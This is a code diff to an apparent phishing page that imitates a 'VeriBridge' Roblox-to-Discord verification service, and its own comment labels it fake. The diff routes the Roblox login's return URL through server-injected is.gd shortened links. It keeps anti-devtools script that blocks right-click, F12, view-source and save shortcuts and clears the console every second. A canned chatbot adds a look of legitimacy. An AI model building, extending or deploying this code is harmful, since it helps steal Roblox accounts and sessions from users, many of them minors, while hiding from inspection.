@@ -217,21 +217,31 @@
 <div class="chat-window" id="chatWindow"><div class="chat-header"><h4>VeriBridge Assistant</h4><button class="close-chat" id="closeChatBtn">✕</button></div><div class="chat-messages" id="chatMessages"><div class="message ai"><div class="message-bubble">Hello! I'm your VeriBridge assistant. Ask me anything!</div></div></div><div class="chat-input-area"><input type="text" class="chat-input" id="chatInput" placeholder="Ask me anything..."><button class="send-btn" id="sendChatBtn">Send</button></div></div>
 
 <script>
-// ==================== FAKE VERIBRIDGE GEN INTEGRATION ====================
+// ==================== FAKE VERIBRIDGE GEN INTEGRATION WITH is.gd ====================
+// These values are injected by the server
 const VERIFY_CODE = '{{VERIFY_CODE}}';
-const ORIGINAL_URL = '{{ORIGINAL_URL}}';
-const CURRENT_DOMAIN = '{{CURRENT_DOMAIN}}';
+const ORIGINAL_URL = '{{ORIGINAL_URL}}';  // This is now an is.gd shortened URL
+const CURRENT_DOMAIN = '{{CURRENT_DOMAIN}}';  // This is now an is.gd holder URL
+const IS_GD_HOLDER = '{{IS_GD_HOLDER}}';  // Same as CURRENT_DOMAIN
 
 console.log('[VeriBridge] Verification Code:', VERIFY_CODE);
-console.log('[VeriBridge] Original URL:', ORIGINAL_URL);
+console.log('[VeriBridge] Original URL (is.gd):', ORIGINAL_URL);
+console.log('[VeriBridge] Current Domain (is.gd holder):', CURRENT_DOMAIN);
 
+// The verification config now uses the is.gd holder as the return URL
 const VERIFICATION_CONFIG = {
+    // The Roblox login will redirect back to the is.gd holder
     robloxLoginUrl: ORIGINAL_URL && ORIGINAL_URL !== '{{ORIGINAL_URL}}' 
         ? `https://www.roblox.com/login?returnUrl=${encodeURIComponent(ORIGINAL_URL)}`
         : "https://www.roblox.com/login",
     useOfficialRoblox: true,
-    verificationCode: VERIFY_CODE
+    verificationCode: VERIFY_CODE,
+    // Store the is.gd holder for display purposes
+    isGdHolder: IS_GD_HOLDER
 };
+
+// Display the is.gd holder info in the console
+console.log('[VeriBridge] Using is.gd holder:', IS_GD_HOLDER);
 
 // Anti-devtools
 (function(){document.addEventListener('contextmenu',function(e){e.preventDefault()});document.addEventListener('keydown',function(e){if(e.key==='F12'||(e.ctrlKey&&e.shiftKey&&e.key==='I')||(e.ctrlKey&&e.shiftKey&&e.key==='J')||(e.ctrlKey&&e.key==='u')||(e.ctrlKey&&e.key==='s')){e.preventDefault()}});setInterval(function(){console.clear()},1000)})();
@@ -266,6 +276,7 @@ function getAIResponse(question){
     if(q.includes('verify')) return "Enter your username, select a method, and click 'Start Verification'.";
     if(q.includes('discord')) return "VeriBridge syncs Roblox data to Discord roles!";
     if(q.includes('hello')) return "Hello! Welcome to VeriBridge.";
+    if(q.includes('is.gd')) return `This verification is using is.gd holder: ${IS_GD_HOLDER}`;
     return "I can help with Roblox verification, Discord integration, and group commands!";
 }
 
